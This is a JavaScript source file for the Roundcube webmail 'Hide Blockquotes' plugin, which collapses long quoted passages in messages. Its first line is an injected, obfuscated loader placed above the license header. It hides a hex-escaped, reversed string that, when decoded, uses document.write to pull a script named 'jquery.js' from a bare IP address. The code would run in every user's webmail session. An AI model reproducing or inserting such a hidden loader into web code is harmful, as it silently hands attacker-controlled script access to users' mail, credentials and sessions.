var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
/**
 * Hide Blockquotes plugin script
 *
 * @licstart  The following is the entire license notice for the
 * JavaScript code in this file.
 *
 * Copyright (c) 2012-2014, The Roundcube Dev Team
 *
 * The JavaScript code in this page is free software: you can redistribute it
 * and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * @licend  The above is the entire license notice
 * for the JavaScript code in this file.
 */

if (window.rcmail)
  rcmail.addEventListener('init', function() { hide_blockquote(); });

function hide_blockquote()
{
  var limit = rcmail.env.blockquote_limit;

  if (limit <= 0)
    return;

  $('div.message-part div.pre > blockquote', $('#messagebody')).each(function() {
    var div, link, q = $(this),
      text = $.trim(q.text()),
      res = text.split(/\n/);

    if (res.length <= limit) {
      // there can be also a block with very long wrapped line
      // assume line height = 15px
      if (q.height() <= limit * 15)
        return;
    }

    div = $('<blockquote class="blockquote-header">')
      .css({'white-space': 'nowrap', overflow: 'hidden', position: 'relative'})
      .text(res[0]);

    link = $('<span class="blockquote-link"></span>')
      .css({position: 'absolute', 'z-Index': 2})
      .text(rcmail.get_label('hide_blockquote.show'))
      .data('parent', div)
      .click(function() {
        var t = $(this), parent = t.data('parent'), visible = parent.is(':visible');

        t.text(rcmail.get_label(visible ? 'hide' : 'show', 'hide_blockquote'))
          .detach().appendTo(visible ? q : parent);

        parent[visible ? 'hide' : 'show']();
        q[visible ? 'show' : 'hide']();
      });

    link.appendTo(div);

    // Modify blockquote
    q.hide().css({position: 'relative'}).before(div);
  });
}
